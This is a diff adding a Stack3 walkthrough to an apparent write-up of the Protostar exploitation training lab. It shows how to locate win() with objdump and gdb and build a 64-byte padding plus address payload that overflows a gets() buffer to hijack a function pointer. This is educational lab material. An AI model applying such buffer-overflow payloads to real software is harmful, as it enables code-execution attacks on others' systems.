@@ -145,3 +145,30 @@ user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c "print 'A'*64+'\x0
 user@protostar:/opt/protostar/bin$ ./stack2
 you have correctly modified the variable
    ```
+Stack3 :
+
+In this challenge we have to rewrite "modified" with the memory address of win(). Memory address of win can be found with gdb or objdump.
+```
+user@protostar:/opt/protostar/bin$ objdump -d stack3 | grep "win"
+08048424 <win>:
+user@protostar:/opt/protostar/bin$ gdb ./stack3
+(gdb) disassemble win
+Dump of assembler code for function win:
+0x08048424 <win+0>:     push   ebp
+0x08048425 <win+1>:     mov    ebp,esp
+0x08048427 <win+3>:     sub    esp,0x18
+0x0804842a <win+6>:     mov    DWORD PTR [esp],0x8048540
+0x08048431 <win+13>:    call   0x8048360 <puts@plt>
+0x08048436 <win+18>:    leave
+0x08048437 <win+19>:    ret
+End of assembler dump.
+```
+
+Here the problem is with gets call which will continue writing to or beyond buffer and can overwrite fp. By changing the value of fp to address of win() which is at  0x08048424. So user_input for gets call should be ```<any 64 bytes>+"\x24\x84\x04\x08"```
+
+```
+user@protostar:/opt/protostar/bin$ python -c "print 'A'*64+'\x24\x84\x04\x08'" > /tmp/s3.txt
+user@protostar:/opt/protostar/bin$ ./stack3 </tmp/s3.txt
+calling function pointer, jumping to 0x08048424
+code flow successfully changed
+```
